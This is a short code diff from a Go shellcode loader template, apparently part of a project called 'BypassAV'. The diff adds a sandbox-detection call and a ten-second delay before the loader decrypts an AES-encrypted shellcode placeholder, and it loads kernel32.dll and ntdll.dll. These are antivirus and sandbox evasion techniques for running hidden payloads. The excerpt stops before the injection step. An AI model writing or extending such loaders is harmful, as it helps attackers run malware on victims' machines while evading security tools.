@@ -2,20 +2,24 @@ package main
 
 import (
 	"BypassAV/In/encrypt"
-	"golang.org/x/sys/windows"
+	"BypassAV/In/sandbox"
 	"encoding/hex"
+	"golang.org/x/sys/windows"
 	"strconv"
+	"time"
 	"unsafe"
 )
 var (
-        aeskey = "{{.AesKey}}"
-        sc  = "{{.Exshell}}"
-        Kmode = "{{.Keymode}}"
+	aeskey = "{{.AesKey}}"
+	sc  = "{{.Exshell}}"
+	Kmode = "{{.Keymode}}"
 )
 
 func main() {
+	sandbox.IFlanguage()
+	time.Sleep(10 * time.Second)
 
-    shellcode :=sdec(sc)
+	shellcode :=sdec(sc)
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	ntdll := windows.NewLazySystemDLL("ntdll.dll")
 
